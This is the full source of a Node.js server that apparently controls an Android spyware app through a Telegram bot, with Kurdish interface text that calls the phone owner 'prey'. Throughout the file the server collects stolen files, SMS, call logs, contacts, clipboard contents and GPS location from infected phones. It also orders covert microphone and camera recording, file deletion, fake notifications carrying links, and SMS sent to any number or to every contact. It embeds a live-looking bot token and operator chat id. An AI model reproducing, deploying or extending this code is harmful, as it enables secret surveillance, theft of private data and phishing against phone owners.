const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8530600841:AAHta55RN-hdQZuiQyUz9mQ6yL8IdTDajiw'
const id = '5578405082'
const address = 'https://www.google.com'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

app.get('/', function (req, res) {
    res.send('<h1 align="center">سێرڤەری حەشاشی بە سەرکەوتوویی کار دەکات | گەشەپێدەر: حەشاشی</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• فایلێک لە مۆبایلی <b>${req.headers.model}</b> گەیشت`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})
app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• نامەیەک لە مۆبایلی <b>${req.headers.model}</b> هات\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})
app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• شوێنی مۆبایلی <b>${req.headers.model}</b> دیاری کرا`, {parse_mode: "HTML"})
    res.send('')
})
appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })
    appBot.sendMessage(id,
        `°• ئامێرێکی نوێ پەیوەست بوو 🔥\n\n` +
        `• مۆدێلی ئامێر : <b>${model}</b>\n` +
        `• ڕێژەی شەحن : <b>${battery}%</b>\n` +
        `• وەشەنی ئەندرۆید : <b>${version}</b>\n` +
        `• ڕووناکی شاشە : <b>${brightness}</b>\n` +
        `• کۆمپانیای هێڵ : <b>${provider}</b>`,
        {parse_mode: "HTML"}
    )
    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• ئامێرێک پەیوەندی پچڕا ❌\n\n` +
            `• مۆدێلی ئامێر : <b>${model}</b>\n` +
            `• ڕێژەی شەحن : <b>${battery}%</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
    })
})
appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('°• تکایە ئەو ژمارەیە بنووسە کە دەتەوێت نامەکەی بۆ بنێریت')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• زۆر باشە، ئێستا ئەو نامەیە بنووسە کە دەتەوێت لە مۆبایلی نێچیرەکەوە بنێردرێت....\n\n' +
                '• ئاگاداربە ئەگەر نووسینەکە زۆر درێژ بێت ڕەنگە نەنێردرێت.',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• زۆر باشە، ئێستا ئەو نامەیە بنووسە کە دەتەوێت لە مۆبایلی نێچیرەکەوە بنێردرێت....')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• تکایە ئەو نامەیە بنووسە کە دەتەوێت بۆ هەموو ناوەکان بنێردرێت')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ناونیشانی (Path) ئەو فایلە بنووسە کە دەتەوێت ڕاکێشرێت')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ناونیشانی (Path) ئەو فایلە بنووسە کە دەتەوێت بسڕێتەوە')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ئەو ماوەیە بنووسە کە دەتەوێت دەنگەکە تۆمار بکرێت')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ئەو ماوەیە بنووسە کە دەتەوێت کامێرای سەرەکی تۆمار بکات')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_main:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ئەو ماوەیە بنووسە کە دەتەوێت کامێرای سێلفی تۆمار بکات')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`rec_camera_selfie:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ئەو نامەیە بنووسە کە دەتەوێت لەسەر شاشەی نێچیر دەرکەوێت')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• ئەو نامەیە بنووسە کە دەتەوێت وەک ئاگادارکردنەوە دەرکەوێت')) {
            const notificationMessage = message.text
            currentTitle = notificationMessage
            appBot.sendMessage(id,
                '°• نایابە، ئێستا ئەو لینکە بنووسە کە دەتەوێت لەکاتی کلیک کردن لەسەر ئاگادارکردنەوەکە بکرێتەوە',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('°• نایابە، ئێستا ئەو لینکە بنووسە کە دەتەوێت لەکاتی کلیک کردن لەسەر ئاگادارکردنەوەکە بکرێتەوە')) {
            const link = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`show_notification:${currentTitle}/${link}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('°• لینکی ئەو دەنگە بنووسە کە دەتەوێت لێبدرێت')) {
            const audioLink = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`play_audio:${audioLink}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
                '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (id == chatId) {
        if (message.text == '/start') {
            appBot.sendMessage(id,
                '°• بەخێربێن بۆ بۆتی هاککردنی حەشاشی | گەشەپێدەر: حەشاشی\n\n' +
                '• ئەگەر ئەپەکە لەسەر ئامێری نێچیر جێگیر کراوە، چاوەڕێی پەیوەندی بکە\n\n' +
                '• کاتێک نامەی پەیوەستبوونت پێ دەگات، واتە ئامێرەکە ئامادەیە بۆ وەرگرتنی فەرمان\n\n' +
                '• کلیک لەسەر دوگمەی "جێبەجێکردنی فەرمان" بکە و ئامێرەکە هەڵبژێرە\n\n' +
                '• ئەگەر لە هەر شوێنێک پەکەت کەوت، فەرمانی /start بنێرە،',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.text == 'ئامێرە پەیوەستبووەکان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ ئامێرێکی پەیوەستبوو نییە\n\n' +
                    '• دڵنیابە ئەپەکە لەسەر مۆبایلی نێچیر کار دەکات'
                )
            } else {
                let text = '°• لیستی ئامێرە پەیوەستبووەکان :\n\n'
                appClients.forEach(function (value, key, map) {
                    text += `• مۆدێلی ئامێر : <b>${value.model}</b>\n` +
                        `• ڕێژەی شەحن : <b>${value.battery}%</b>\n` +
                        `• وەشەنی ئەندرۆید : <b>${value.version}</b>\n` +
                        `• ڕووناکی شاشە : <b>${value.brightness}</b>\n` +
                        `• کۆمپانیای هێڵ : <b>${value.provider}</b>\n\n`
                })
                appBot.sendMessage(id, text, {parse_mode: "HTML"})
            }
        }
        if (message.text == 'جێبەجێکردنی فەرمان') {
            if (appClients.size == 0) {
                appBot.sendMessage(id,
                    '°• هیچ ئامێرێکی پەیوەستبوو نییە\n\n' +
                    '• دڵنیابە ئەپەکە لەسەر مۆبایلی نێچیر کار دەکات'
                )
            } else {
                const deviceListKeyboard = []
                appClients.forEach(function (value, key, map) {
                    deviceListKeyboard.push([{
                        text: value.model,
                        callback_data: 'device:' + key
                    }])
                })
                appBot.sendMessage(id, '°• ئەو ئامێرە هەڵبژێرە کە دەتەوێت فەرمانی لەسەر جێبەجێ بکەیت', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '°• داواکارییەکە ڕەتکرایەوە')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`°• فەرمان هەڵبژێرە بۆ ئامێری : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'ئەپەکان 📱', callback_data: `apps:${uuid}`},
                        {text: 'زانیاری ئامێر ℹ️', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: 'کێشانی فایلەکان 📁', callback_data: `file:${uuid}`},
                        {text: 'سڕینەوەی فایل 🗑', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: 'کۆپیکراوەکان 📋', callback_data: `clipboard:${uuid}`},
                        {text: 'مایکرۆفۆن 🎙', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: 'کامێرای سەرەکی 📸', callback_data: `camera_main:${uuid}`},
                        {text: 'کامێرای سێلفی 🤳', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: 'شوێن (GPS) 📍', callback_data: `location:${uuid}`},
                        {text: 'نیشاندانی نامە 💬', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: 'پەیوەندییەکان 📞', callback_data: `calls:${uuid}`},
                        {text: 'ناوەکان (Contacts) 👤', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: 'لەرزین (Vibrate) 📳', callback_data: `vibrate:${uuid}`},
                        {text: 'ناردنی ئاگادارکردنەوە 🔔', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: 'نامەکان (SMS) 📩', callback_data: `messages:${uuid}`},
                        {text: 'ناردنی نامە 📤', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: 'لێدانی دەنگ 🎵', callback_data: `play_audio:${uuid}`},
                        {text: 'ڕاگرتنی دەنگ 🔇', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: 'ناردنی نامە بۆ هەموو ناوەکان 📢',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• داواکارییەکەت نێردرا، تکایە کەمێک بوەستە........\n\n' +
            '• بەم زووانە وەڵامت پێ دەگات | گەشەپێدەر: حەشاشی',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["ئامێرە پەیوەستبووەکان"], ["جێبەجێکردنی فەرمان"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '°• تکایە ئەو ژمارەیە بنووسە کە دەتەوێت نامەکەی بۆ بنێریت\n\n' +
            '• دەتوانیت ژمارەکە بە سفری سەرەتا یان بە کۆدی وڵاتەوە بنووسیت،',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• تکایە ئەو نامەیە بنووسە کە دەتەوێت بۆ هەموو ناوەکان بنێردرێت\n\n' +
            '• دڵنیابە نووسینەکەت لە چەند دێڕێک زیاتر نەبێت بۆ ئەوەی پڕۆسەکە خێرا بێت،',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ناونیشانی (Path) ئەو فایلە بنووسە کە دەتەوێت ڕاکێشرێت\n\n' +
            '• پێویست بە ناونیشانی تەواو ناکات، تەنها شوێنە سەرەکییەکە بنووسە. بۆ نموونە: <b> DCIM/Camera </b> بۆ ڕاکێشانی وێنەکان.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ناونیشانی (Path) ئەو فایلە بنووسە کە دەتەوێت بسڕێتەوە\n\n' +
            '• ئاگاداربە! تەنها ناونیشانی سەرەکی بنووسە. بۆ نموونە: <b> DCIM/Camera </b> بۆ سڕینەوەی وێنەکانی گالەری.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ئەو ماوەیە بنووسە کە دەتەوێت دەنگەکە تۆمار بکرێت\n\n' +
            '• تێبینی: دەبێت کاتەکە تەنها بە ژمارە و بە چرکە (Seconds) بنووسیت،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ئەو نامەیە بنووسە کە دەتەوێت لەسەر شاشەی نێچیر دەرکەوێت\n\n' +
            '• ئەمە نامەیەکی کورتە و بۆ چەند چرکەیەک لە خوارەوەی شاشەی مۆبایلی نێچیر دەردەکەوێت،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• ئەو نامەیە بنووسە کە دەتەوێت وەک ئاگادارکردنەوە دەرکەوێت\n\n' +
            '• نامەکەت لە بەشی سەرەوەی مۆبایلی نێچیر وەک ئاگادارکردنەوەیەکی ئاسایی دەردەکەوێت،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '°• لینکی ئەو دەنگە بنووسە کە دەتەوێت لێبدرێت\n\n' +
            '• تێبینی: دەبێت لینکەکە ڕاستەوخۆ بێت (Direct Link) ئەگەر نا دەنگەکە لێ نادرێت،',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8000);
